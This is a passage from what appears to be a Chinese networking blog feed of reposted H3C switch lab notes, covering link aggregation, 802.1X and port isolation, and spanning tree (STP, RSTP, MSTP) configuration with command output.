1</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[SW1]interface g1/0/2</span><br><span class="line">[SW1-GigabitEthernet1/0/2]port link-aggregation group 1</span><br></pre></td></tr></table></figure><p><em>步骤3：查看链路聚合状态，发现已经成功运行</em></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">[SW1]display link-aggregation verbose</span><br><span class="line">  ……</span><br><span class="line"></span><br><span class="line">  Port             Status  Priority Oper-Key</span><br><span class="line"></span><br><span class="line">GE1/0/1          S       32768    1         </span><br><span class="line">GE1/0/2          S       32768    1 </span><br></pre></td></tr></table></figure><p><em>步骤4：SW2上命令与SW1上完全一致，这里省略</em></p><p>​3.<strong>SW1和SW2之间的直连链路要配置为Trunk类型，允许所有vlan通过</strong></p><p>　　<em>分析：物理接口加入到聚合接口后，会自动继承聚合接口的vlan相关配置，所以不需要在物理接口上分别配置Trunk，只需要在聚合接口下配置Trunk即可</em></p><p><em>步骤1：在SW1的<code>Bridge-Aggregation 1</code>接口的接口视图下，把该聚合接口配置为Trunk，并允许所有vlan通过。命令执行完毕后，会显示配置已经在g1&#x2F;0&#x2F;1和g1&#x2F;0&#x2F;2接口上自动完成</em></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">[SW1]interface Bridge-Aggregation 1</span><br><span class="line">[SW1-Bridge-Aggregation1]port link-type trunk</span><br><span class="line">Configuring GigabitEthernet1/0/1 done.</span><br><span class="line">Configuring GigabitEthernet1/0/2 done.</span><br><span class="line">[SW1-Bridge-Aggregation1]port trunk permit vlan all</span><br><span class="line">Configuring GigabitEthernet1/0/1 done.</span><br><span class="line">Configuring GigabitEthernet1/0/2 done.</span><br></pre></td></tr></table></figure><p><em>步骤2：SW2上命令与SW1上完全一致，这里省略</em></p><p>​4.中断SW1和SW2之间的一条直连链路，测试PC3和PC4是否仍然能够继续访问</p><p>　　<em>分析：链路聚合会自动把SW1和SW2之间的流量进行负载均衡，某一条链路中断连接后，也仍然还有另外一条链路可以继续通讯，所以PC3和PC4可以继续访问</em></p><p><em>步骤1：进入SW1的g1&#x2F;0&#x2F;1接口的接口视图，使用<code>shutdown</code>命令关闭接口</em></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[SW1]interface g1/0/1</span><br><span class="line">[SW1-GigabitEthernet1/0/1]shutdown </span><br></pre></td></tr></table></figure><p><em>步骤2：测试结果，PC3仍然可以Ping通PC4</em></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;H3C&gt;ping 192.168.1.2</span><br><span class="line">Ping 192.168.1.2 (192.168.1.2): 56 data bytes, press CTRL_C to break</span><br><span class="line">56 bytes from 192.168.1.2: icmp_seq=0 ttl=255 time=0.000 ms</span><br><span class="line">56 bytes from 192.168.1.2: icmp_seq=1 ttl=255 time=0.000 ms</span><br><span class="line">56 bytes from 192.168.1.2: icmp_seq=2 ttl=255 time=0.000 ms</span><br><span class="line">56 bytes from 192.168.1.2: icmp_seq=3 ttl=255 time=0.000 ms</span><br><span class="line">56 bytes from 192.168.1.2: icmp_seq=4 ttl=255 time=0.000 ms</span><br></pre></td></tr></table></figure><br /><br /><blockquote><p>转载于<a href="http://www.dengfm.com/">邓方鸣-在线文档库</a></p><p>转载目的：学习</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> 数通实验 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> H3C实验 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>交换机端口安全实验</title>
      <link href="/posts/48316"/>
      <url>/posts/48316</url>
      
        <content type="html"><![CDATA[<br /><br /><h3 id="实验拓扑"><a href="#实验拓扑" class="headerlink" title="实验拓扑"></a>实验拓扑</h3><p><img src="/images/%E4%BA%A4%E6%8D%A2%E6%9C%BA%E7%AB%AF%E5%8F%A3%E5%AE%89%E5%85%A8%E5%AE%9E%E9%AA%8C/01.jpg"></p><hr><h3 id="实验需求"><a href="#实验需求" class="headerlink" title="实验需求"></a>实验需求</h3><p>1.<strong>按照图示配置IP地址</strong></p><p>2.<strong>在SW1所有连接PC的接口上配置开启802.1X验证，使接入的终端需要进行身份验证</strong></p><p>3.<strong>创建一个用户身份验证的用户。用户名为<code>wangdaye</code>，密码为<code>123456</code></strong></p><p>4.<strong>创建一个端口隔离组，实现三台PC无法互相访问</strong></p><hr><h3 id="实验解法"><a href="#实验解法" class="headerlink" title="实验解法"></a>实验解法</h3><p>1.<strong>PC配置IP地址部分略</strong></p><p>2.<strong>在SW1上开启802.1X身份验证</strong></p><p>　　<em>分析：开启802.1X验证需要首先在系统视图下开启全局802.1X，再到接口视图下开启802.1X</em></p><p><em>步骤1：在SW1的系统视图下开启全局802.1X</em></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[SW1]dot1x</span><br></pre></td></tr></table></figure><p><em>步骤2：分别在三个连接PC的接口上开启802.1X</em></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[SW1]interface g1/0/1</span><br><span class="line">[SW1-GigabitEthernet1/0/1]dot1x</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[SW1]interface g1/0/2</span><br><span class="line">[SW1-GigabitEthernet1/0/2]dot1x</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[SW1]interface g1/0/3</span><br><span class="line">[SW1-GigabitEthernet1/0/3]dot1x</span><br></pre></td></tr></table></figure><p>3.<strong>创建一个用户身份验证的用户。用户名为<code>zhangdaye</code>，密码为<code>123456</code></strong></p><p>　　<em>分析：用于802.1X验证的用户类型必须是<code>network</code>，且服务类型为<code>lan-access</code>，否则将无法用于802.1X验证。用于身份验证的用户无需配置身份权限</em></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">[SW1]local-user zhangdaye class network </span><br><span class="line">New local user added.</span><br><span class="line">[SW1-luser-network-wangdaye]password simple 123456</span><br><span class="line">[SW1-luser-network-wangdaye]service-type lan-access</span><br></pre></td></tr></table></figure><blockquote><p>由于802.1X的验证无法在模拟器环境中实现，所以这里不做实验效果测试</p></blockquote><p>4.<strong>创建一个端口隔离组，实现三台PC无法互相访问</strong></p><p>　　<em>分析：端口隔离组用于同vlan内部的端口隔离，属于同一个隔离组的接口无法互相访问，不同隔离组的接口才可以互相访问，所以需要把SW1的三个接口都加入到同一个隔离组</em></p><p><em>步骤1：在SW1上创建编号为<code>1</code>号的隔离组</em></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[SW1]port-isolate group 1</span><br></pre></td></tr></table></figure><p><em>步骤2：把g1&#x2F;0&#x2F;1、g1&#x2F;0&#x2F;2、g1&#x2F;0&#x2F;3接口都加入到该隔离组</em></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[SW1]interface g1/0/1</span><br><span class="line">[SW1-GigabitEthernet1/0/1]port-isolate enable group 1</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[SW1]interface g1/0/2</span><br><span class="line">[SW1-GigabitEthernet1/0/2]port-isolate enable group 1</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[SW1]interface g1/0/3</span><br><span class="line">[SW1-GigabitEthernet1/0/3]port-isolate enable group 1</span><br></pre></td></tr></table></figure><blockquote><p>由于端口隔离的验证无法在模拟器环境中实现，所以这里不做实验效果测试</p></blockquote><br /><br /><blockquote><p>转载于<a href="http://www.dengfm.com/">邓方鸣-在线文档库</a></p><p>转载目的：学习</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> 数通实验 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> H3C实验 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>链路聚合</title>
      <link href="/posts/42441"/>
      <url>/posts/42441</url>
      
        <content type="html"><![CDATA[<br/><br /><h3 id="链路聚合"><a href="#链路聚合" class="headerlink" title="链路聚合"></a>链路聚合</h3><h4 id="定义"><a href="#定义" class="headerlink" title="定义"></a><em><strong>定义</strong></em></h4><ul><li><em>把连接到同一台交换机上的多个物理端口捆绑为一个逻辑端口</em></li></ul><h4 id="功能"><a href="#功能" class="headerlink" title="功能"></a><em><strong>功能</strong></em></h4><ul><li><p><strong>提高链路可靠性</strong></p><ul><li><em>聚合组内只要还有物理端口存活，链路就不会中断</em></li></ul></li><li><p><strong>添加链路传输带宽</strong></p><ul><li><p><em>避免了STP计算，聚合组内物理端口不会被闭塞</em></p></li><li><p><em>交换机之间的流量会自动在聚合组内的所有物理端口上负载分担</em></p></li></ul></li></ul><h4 id="负载分担"><a href="#负载分担" class="headerlink" title="负载分担"></a><em><strong>负载分担</strong></em></h4><p><img src="/images/%E9%93%BE%E8%B7%AF%E8%81%9A%E5%90%88/01.jpg"></p><ul><li><em>也称负载均衡</em></li><li><em>聚合后的链路会基于流自动负载分担</em></li></ul><h4 id="原理"><a href="#原理" class="headerlink" title="原理"></a><em>原理</em></h4><p><em>操作Key</em></p><ul><li><p>定义：<code>操作Key是在链路聚合时，聚合控制根据端口的配置（即速率、双工模式、up/down状态、基本配置等信息）自动生成的一个配置组合。同一聚合组中所有处于选中状态的端口有相同的操作Key。</code></p></li><li><p><code>用于选择链路聚合成员端口的配置信息</code></p></li><li><p><code>由参考端口的第二类配置生成</code></p></li><li><p><code>第二类配置与操作Key一致，端口才能被选中</code></p></li></ul><p><em>参考端口</em></p><ul><li><code>用来选择聚合成员端口的标准端口</code></li></ul><p><em>端口的第一类配置</em></p><ul><li><code>不参与操作key计算的配置信息</code></li><li><code>MVRP、MSTP等</code></li></ul><p><em>端口的第二类配置</em></p><ul><li><code>参与操作key计算的配置信息</code></li><li><code>Vlan配置、端口类型、QinQ、Mac地址学习配置</code></li></ul><h4 id="分类"><a href="#分类" class="headerlink" title="分类"></a><em><strong>分类</strong></em></h4><p><img src="/images/%E9%93%BE%E8%B7%AF%E8%81%9A%E5%90%88/03.jpg"></p><p><strong>静态聚合</strong>：</p><ul><li>参考端口选举规则：<ul><li>高速全双工&gt;高速半双工&gt;低速全双工&gt;低速半双工</li><li>端口ID小的优先</li></ul></li></ul><p><strong>动态聚合</strong>：</p><ul><li>参考端口选举规则：</li></ul><p><img src="/images/%E9%93%BE%E8%B7%AF%E8%81%9A%E5%90%88/02.jpg"></p><h4 id="常用命令"><a href="#常用命令" class="headerlink" title="常用命令"></a><em><strong>常用命令</strong></em></h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">[h3c]interface bridge-aggregation &#x27;number&#x27;#创建聚合端口，进入聚合端口视图</span><br><span class="line">[h3c-GigabitEthernet 1/0/1]port link-aggregation group &#x27;number&#x27;#物理接口加入聚合组</span><br><span class="line">[h3c]display link-aggregation summary#查看聚合链路信息</span><br><span class="line">[h3c-Bridge-aggregation1]link-aggregation mode dynamic   #配置链路聚合模式为动态模式</span><br><span class="line">[h3c]lacp system-priority &#x27;priority&#x27;#配置LACP优先级</span><br><span class="line">[h3c-GigabitEthernet]link-aggregation port-priotity &#x27;priority&#x27;#配置端口优先级</span><br><span class="line">[h3c-Bridge-Aggregation1]link-aggregation selected-port maxium &#x27;number&#x27;#配置最大可用接口shu&#x27;l</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 数通学习 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 数通学习 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>STP实验</title>
      <link href="/posts/52674"/>
      <url>/posts/52674</url>
      
        <content type="html"><![CDATA[<br/><hr><h3 id="实验拓扑"><a href="#实验拓扑" class="headerlink" title="实验拓扑"></a>实验拓扑</h3><p><img src="/images/HCL%E4%B9%8BSTp%E5%AE%9E%E9%AA%8C/01.jpg"></p><hr><h3 id="实验需求"><a href="#实验需求" class="headerlink" title="实验需求"></a>实验需求</h3><p>​1.<em>开启所有设备，等待STP收敛后观察STP状态</em></p><p>​2.<em>使SW4成为根网桥</em></p><p>​3.<em>使闭塞端口出现在SW2上</em></p><p>​4.<em>把SW1上连接的PC的端口配置为边缘端口</em></p><hr><h3 id="实验解法"><a href="#实验解法" class="headerlink" title="实验解法"></a>实验解法</h3><p>1.<strong>等待STP收敛后，查看STP运行状态，找出根网桥，闭塞端口</strong></p><p><em>步骤1：根据HCL模拟器的运行机制，SW1的Mac地址应该是最小的，会成为根网桥，在SW1上查看STP运行状态，确认SW1为根网桥</em></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">[SW1]display stp</span><br><span class="line">-------[CIST Global Info][Mode MSTP]-------</span><br><span class="line">Bridge ID           : 32768.7aef-e4ea-0100</span><br><span class="line">Bridge times        : Hello 2s MaxAge 20s FwdDelay 15s MaxHops 20</span><br><span class="line">Root ID/ERPC        : 32768.7aef-e4ea-0100, 0</span><br><span class="line">RegRoot ID/IRPC     : 32768.7aef-e4ea-0100, 0</span><br><span class="line">RootPort ID         : 0.0</span><br><span class="line">BPDU-Protection     : Disabled</span><br><span class="line">Bridge Config-</span><br><span class="line">Digest-Snooping     : Disabled</span><br><span class="line">TC or TCN received  : 7</span><br><span class="line">Time since last TC  : 0 days 0h:0m:40s</span><br></pre></td></tr></table></figure><p><em>步骤2：根据STP计算机制，所有链路开销一致，闭塞端口应该会出现在SW4上。在SW4上查看端口状态，确认SW4的g1&#x2F;0&#x2F;2被闭塞</em></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">[SW4]display stp brief</span><br><span class="line"> MST ID   Port                                Role  STP State   Protection</span><br><span class="line"> 0        GigabitEthernet1/0/1                ROOT  FORWARDING  NONE</span><br><span class="line"> 0        GigabitEthernet1/0/2                ALTE  DISCARDING  NONE</span><br></pre></td></tr></table></figure><p>2.<strong>使SW4成为新的根网桥</strong></p><p>　　<em>分析：要想使SW4成为根网桥，最好的办法就是让SW4的优先级成为全网最小。默认优先级都为32768，只要把SW4的优先级改成比32768小就可以了</em></p><p><em>步骤1：修改SW4的优先级为4096</em></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[SW4]stp priority 4096</span><br><span class="line">[SW4]%Jul  1 21:16:32:098 2022 SW4 STP/6/STP_DETECTED_TC: Instance 0&#x27;s port GigabitEthernet1/0/2 detected a topology change.</span><br></pre></td></tr></table></figure><p><em>步骤2：在SW4上查看STP运行状态，发现SW4已经成为新的根网桥</em></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">[SW4]display stp </span><br><span class="line">-------[CIST Global Info][Mode MSTP]-------</span><br><span class="line">Bridge ID           : 4096.7af0-0e17-0400</span><br><span class="line">Bridge times        : Hello 2s MaxAge 20s FwdDelay 15s MaxHops 20</span><br><span class="line">Root ID/ERPC        : 4096.7af0-0e17-0400, 0</span><br><span class="line">RegRoot ID/IRPC     : 4096.7af0-0e17-0400, 0</span><br><span class="line">RootPort ID         : 0.0</span><br><span class="line">BPDU-Protection     : Disabled</span><br><span class="line">Bridge Config-</span><br><span class="line">Digest-Snooping     : Disabled</span><br><span class="line">TC or TCN received  : 8</span><br><span class="line">Time since last TC  : 0 days 0h:1m:30s</span><br></pre></td></tr></table></figure><p>3.<strong>使闭塞端口出现在SW2上</strong></p><p><em>分析：SW4成为了根网桥，按照STP计算机制，闭塞端口此时应该在SW1上。要使闭塞端口到SW2上，就需要让SW2到SW1的cost比SW4到SW1更大。H3C交换机千兆口的cost默认是20，我们可以把SW2的g1&#x2F;0&#x2F;2接口的cost改为1000</em></p><p><em>步骤1：在SW2上进入g1&#x2F;0&#x2F;2接口的接口视图，修改stp cost为1000</em></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">[SW2]interface g1/0/2</span><br><span class="line">[SW2-GigabitEthernet1/0/2]stp cost 1000</span><br><span class="line">[SW2-GigabitEthernet1/0/2]%Mar 21 22:16:05:399 2018 SW2 STP/6/STP_NOTIFIED_TC: Instance 0&#x27;s port GigabitEthernet1/0/1 was notified a topology change.</span><br></pre></td></tr></table></figure><p><em>步骤2：在SW2上查看STP接口状态，发现SW2的g1&#x2F;0&#x2F;2接口已经成为了新的闭塞端口</em></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">[SW2]display stp brief </span><br><span class="line">MST ID   Port                                Role  STP State   Protection</span><br><span class="line">0        GigabitEthernet1/0/1                ROOT  FORWARDING  NONE</span><br><span class="line">0        GigabitEthernet1/0/2                ALTE  DISCARDING  NONE</span><br></pre></td></tr></table></figure><p>4.<strong>把SW1连接PC的所有接口配置为边缘接口</strong></p><p>什么是边缘端口？从阻塞状态直接到转发状态的端口</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">[SW1]interface g 1/0/3</span><br><span class="line">[SW1-GigabitEthernet1/0/3]stp edged-port</span><br><span class="line">Edge port should only be connected to terminal. It will cause temporary loops if port GigabitEthernet1/0/3 is connected to bridges. Please use it carefully.</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">[SW1-GigabitEthernet1/0/3]int g 1/0/4</span><br><span class="line">[SW1-GigabitEthernet1/0/4]stp edged-port</span><br><span class="line">Edge port should only be connected to terminal. It will cause temporary loops if port GigabitEthernet1/0/4 is connected to bridges. Please use it carefully.</span><br><span class="line"></span><br></pre></td></tr></table></figure><br /><br /><blockquote><p>转载于<a href="http://www.dengfm.com/">邓方鸣-在线文档库</a></p><p>转载目的：学习</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> 数通实验 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> H3C实验 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>生成树协议</title>
      <link href="/posts/43757"/>
      <url>/posts/43757</url>
      
        <content type="html"><![CDATA[<br /><br /><p style="text-align:center;color:red;font-size:1.5em;font-weight: bold;">生成树协议<p><img src="/images/%E7%94%9F%E6%88%90%E6%A0%91%E5%8D%8F%E8%AE%AE/01.jpg"></p><p><em>二层环路带来的问题</em>：<em><strong>广播风暴、MAC地址表震荡</strong></em></p><h3 id="生成树定义"><a href="#生成树定义" class="headerlink" title="生成树定义"></a>生成树定义</h3><ul><li><em>STP(Spanning Tree Protocol)，用来解决二层环路问题</em></li></ul><h3 id="STP"><a href="#STP" class="headerlink" title="STP"></a>STP</h3><h4 id="STP相关概念"><a href="#STP相关概念" class="headerlink" title="STP相关概念"></a>STP相关概念</h4><p>BPDU</p><p><em><strong>定义</strong></em>：<em>桥协议 数据单元，用于传递STP协议相关报文</em></p><p>STP二层组播：<strong>01-80-C2</strong></p><p><em><strong>分类</strong></em>：</p><ul><li><em>配置 BPDU用于传递STP的配置信息</em></li><li><em>TCN BPDU用于通告拓扑变更信息</em></li></ul><h4 id="STP的选举机制"><a href="#STP的选举机制" class="headerlink" title="STP的选举机制"></a>STP的选举机制</h4><p>1.<code>在所有交换机中选举出一台作为根网桥(Root bridge)</code></p><ul><li><p><code>选举规则</code><em>Bridge-id小的优先</em></p></li><li><p><code>Bridge-id</code></p></li><li><p><code>定义</code><em>Bridge-id，用来标识交换机身份</em></p></li><li><p><code>格式</code><em>优先级+Mac地址，优先级默认为32768，必须是4096的倍数</em></p></li></ul><p>2.<code>每台非根网桥(交换机)选举出一个根端口(Root Port)</code></p><p><code>选举规则</code></p><ul><li><em>到达根网桥开销小的优先</em></li><li><em>对端交换机Bridge-ID小的优先</em></li><li><em>端口ID小的优先</em></li></ul><p><code>开销</code>  <em>Cost，代表路径耗费的代价和成本，带宽越大，开销越小</em></p><p>3.<code>每个物理段上选举出一个指定端口(Designated port)</code> </p><p><code>选举规则</code></p><ul><li><em>到达根网桥开销小的优先</em></li><li><em>本机Bridge-ID小的优先</em></li><li><em>端口ID小的优先</em></li></ul><p>4.<code>剩下没有角色的端口就是阻塞端口（Blocked Port）</code></p><h4 id="STP初始化流程"><a href="#STP初始化流程" class="headerlink" title="STP初始化流程"></a>STP初始化流程</h4><h5 id="交换机端口状态"><a href="#交换机端口状态" class="headerlink" title="交换机端口状态"></a>交换机端口状态</h5><ul><li><em>disable：禁用状态，被关闭的端口</em></li><li><em>blocking：阻塞状态接收BPDU(学习数据报文)，但不发送BPDU，不学习Mac地址，不转发数据</em></li><li><em>listening：监听状态接收并发送BPDU，不学习Mac地址，不转发数据，持续15秒。此状态下进行选举</em></li><li><em>learning：学习状态接收并发送BPDU，学习Mac地址，不转发数据，持续15秒</em></li><li><em>forwarding：转发状态      接收并发送BPDU，学习Mac地址，转发数据</em></li></ul><h4 id="STP计时器"><a href="#STP计时器" class="headerlink" title="STP计时器"></a>STP计时器</h4><ul><li><em>Hello Time     2秒，配置BPDU的发送周期</em></li><li><em>Max age20秒，判断链路故障的时间，10个Hello time周期</em></li><li><em>Forwarding delay15,状态切换延迟</em></li></ul><h4 id="STP拓扑变更机制"><a href="#STP拓扑变更机制" class="headerlink" title="STP拓扑变更机制"></a>STP拓扑变更机制</h4><ul><li><em>1.Max age超时（接口挂了）&#x2F;有接口变更为转发状态，判断为拓扑发生变更，向根网桥发起TCN BPDU</em></li><li><em>2.收到TCN BPDU的交换机继续向根网桥转发TCN BPDU，到达根网桥为止</em></li><li><em>3.根网桥收到TCN BPDU后，向所有端口发起TC置位的配置BPDU</em></li><li><em>4.交换机收到TC置位的配置BPDU后，Mac地址表的老化时间缩短到15秒</em></li></ul><h4 id="STP的问题"><a href="#STP的问题" class="headerlink" title="STP的问题"></a>STP的问题</h4><ul><li><em>收敛速度慢，故障切换时间长</em></li><li><em>网络中大量主机频繁上下线，会导致TCN BPDU以及TC置为BPDU大量发送</em></li></ul><h4 id="STP常用命令"><a href="#STP常用命令" class="headerlink" title="STP常用命令"></a>STP常用命令</h4><ul><li><em>[h3c]display stp查看STP相关信息</em></li><li><em>[h3c]display stp brief查看STP端口状态</em></li><li><em>[h3c]stp global enable 全局启用STP</em></li><li><em>[h3c-GigabitEthernet 1&#x2F;0&#x2F;1]undo stp enable 关闭端口上STP</em></li><li><em>[h3c]stp mode ‘stp&#x2F;rstp&#x2F;mstp’更改STP模式，默认模式是mstp</em></li><li><em>[h3c]stp priority ‘priority’更改交换机优先级</em></li><li><em>[h3c-GigabitEthernet 1&#x2F;0&#x2F;1]stp cost ‘cost’更改接口生成树的cost</em></li><li><em>[h3c-GigabitEthernet 1&#x2F;0&#x2F;1]stp edged-port配置端口为边缘端口</em></li></ul><br /><h3 id="RSTP"><a href="#RSTP" class="headerlink" title="RSTP"></a>RSTP</h3><p><em>定义</em>：<code>快速生成树协议，与STP基本思想一致，可兼容STP运行</code></p><h4 id="与STP的区别"><a href="#与STP的区别" class="headerlink" title="与STP的区别"></a>与STP的区别</h4><ul><li><p><em>端口状态减少到三种</em></p><ul><li><p>Discarding不发送BPDU,不学习MAC地址，不转发数据</p></li><li><p>Learning     发送BPDU，学习MAC地址，不转发数据</p></li><li><p>Forwarding     发送BPDU，学习MAC地址，转发数据</p></li></ul></li><li><p><em>端口角色添加到四种</em></p><ul><li><p><em>根端口和指定端口不变</em></p></li><li><p><em>阻塞端口细分为2种</em></p><ul><li><em>替代端口（Alternata port）根端口的备份</em></li><li><em>备份端口（Backup Port）指定端口的备份</em></li></ul></li></ul></li></ul><p><img src="/images/%E7%94%9F%E6%88%90%E6%A0%91%E5%8D%8F%E8%AE%AE/02.jpg"></p><h4 id="RSTP的快速收敛机制"><a href="#RSTP的快速收敛机制" class="headerlink" title="RSTP的快速收敛机制"></a>RSTP的快速收敛机制</h4><ul><li><em>边缘端口机制</em><ul><li><p><em>当链路激活，边缘端口立即进入转发状态，不参与STP计算</em></p></li><li><p><em>边缘端口UP&#x2F;DOWN不会触发拓扑变更</em></p></li><li><p><em>边缘端口收到BPDU，会转变为非边缘端口</em></p></li></ul></li><li>根端口的快速切换<ul><li>根端口故障后，如果新的根端口对端的指定端口处于转发转发状态，则新的根端口立即进入转发状态</li></ul></li><li>指定端口的快速切换   <strong>P&#x2F;A机制</strong><ul><li><strong>i</strong>.  SW1新增链路或故障链路恢复，指定端口要进入转发状态之前，向对端SW2发送Proposal报文</li><li><strong>ii</strong>.  SW2收到Proposal报文后，立即进行同步操作<ul><li>同步是指阻塞除边缘端口以外的所有端口，为了防止环路</li></ul></li><li><strong>iii</strong>.   同步完成后，向对端SW1发送Agreement报文</li><li><strong>iv</strong>.    收到Agreement报文后，SW1的指定端口进入转发状态</li></ul></li></ul><h4 id="RSTP的拓扑改变处理机制"><a href="#RSTP的拓扑改变处理机制" class="headerlink" title="RSTP的拓扑改变处理机制"></a>RSTP的拓扑改变处理机制</h4><p>处理机制</p><ul><li>只有非边缘端口转变为Forwarding，才产生拓扑改变</li><li>拓扑变更后，向所有其他指定端口和根端口发送TC置位BPDU</li><li>收到TC置位BPDU，清楚其他所有端口学习的MAC地址</li></ul><p>注意</p><ul><li>由于每台交换机都可以主动发起RST BPDU,所以取消了TCN机制</li></ul><p><img src="/images/%E7%94%9F%E6%88%90%E6%A0%91%E5%8D%8F%E8%AE%AE/03.jpg"></p><br /><h3 id="MSTP"><a href="#MSTP" class="headerlink" title="MSTP"></a>MSTP</h3><p><em>STP&#x2F;RSTP的缺陷</em>：<code>所有VLAN共享一颗生成树</code></p><p><code>阻塞链路被完全浪费，无法实现不同VLAN在多链路上负载分担</code></p><h4 id="定义"><a href="#定义" class="headerlink" title="定义"></a>定义</h4><ul><li>多生成树协议</li><li>基于实例计算出多颗生成树，实例间实现负载分担</li></ul><h4 id="基本概念"><a href="#基本概念" class="headerlink" title="基本概念"></a>基本概念</h4><p><img src="/images/%E7%94%9F%E6%88%90%E6%A0%91%E5%8D%8F%E8%AE%AE/04.jpg"></p><h4 id="MSTP配置要点"><a href="#MSTP配置要点" class="headerlink" title="MSTP配置要点"></a>MSTP配置要点</h4><ul><li><code>MST配置完成或修改MST配置后，一定要激活配置才能生效</code></li></ul><h4 id="MSTP兼容性"><a href="#MSTP兼容性" class="headerlink" title="MSTP兼容性"></a>MSTP兼容性</h4><p><img src="/images/%E7%94%9F%E6%88%90%E6%A0%91%E5%8D%8F%E8%AE%AE/05.jpg"></p><h3 id="STP保护机制"><a href="#STP保护机制" class="headerlink" title="STP保护机制"></a>STP保护机制</h3><p><img src="/images/%E7%94%9F%E6%88%90%E6%A0%91%E5%8D%8F%E8%AE%AE/06.jpg"></p><h4 id="相关命令"><a href="#相关命令" class="headerlink" title="相关命令"></a>相关命令</h4><p><code>[h3c]stp-region-configuration#进入MST域配置模式</code></p><p><code>[h3c-mst-region]region-name &#39;name&#39;#配置MST域名</code></p><p><code>[h3c-mst-region]revision-level &#39;level&#39;#配置修订级别</code></p><p><code>[h3c-mst-region]instance &#39;instance-id&#39; vlan &#39;vlan-list&#39;#配置实例和VLAN映射关系</code></p><p><code>[h3c-mst-region]active region-configuration#激活MST配置</code></p><p><code>[h3c]stp instance &#39;instance-id&#39; root &#39;primary/secondary&#39;#配置交换机为实例的主备根</code></p><p><code>[h3c]display region-configuration 